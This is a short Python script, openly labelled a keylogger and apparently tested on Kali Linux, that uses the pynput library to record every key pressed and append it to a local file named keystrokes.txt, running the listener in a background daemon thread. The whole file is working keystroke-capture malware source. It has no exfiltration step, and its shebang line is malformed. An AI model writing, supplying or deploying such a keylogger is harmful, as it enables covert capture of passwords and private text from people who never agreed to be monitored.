#!/bin/bash/env python

#importing modules 
try:
    import threading
    from pynput import keyboard
except:
    pass

#keystroke record
class keylogger:

    #tested on linux (Linux kali 6.5.0-kali2-amd64)
    def Keylogging(self):
        
        def on_key_press(key):
            try:            
                with open('keystrokes.txt','a+') as fh:
                    fh.write(f'{key.char}')
            except:
                with open('keystrokes.txt','a+') as fh:
                    key=str(key)

                    #if spacebar is pressed just add a white space
                    if key == 'Key.space':
                        fh.write(' ')

                    #if shift is pressed just pass the condition
                    elif key == 'Key.shift': 
                        pass
                    
                    #if ctrl is pressed,will get logged in as 'ctrl + {key}'
                    elif key == 'Key.ctrl': 
                        fh.write(f'\nctrl + ')
                    
                    else:
                        fh.write(f'\n{key}\n')

        # Create listener objects
        with keyboard.Listener(on_press=on_key_press) as listener:
            listener.join()



if __name__=='__main__':
    #creating an object
    obj=keylogger()

    #implementing threading and daemon = True (to run it in background)
    t1 = threading.Thread(target=obj.Keylogging,daemon = True)
    
    # start the threads
    t1.start()
    
    # join the main thread
    t1.join()
    

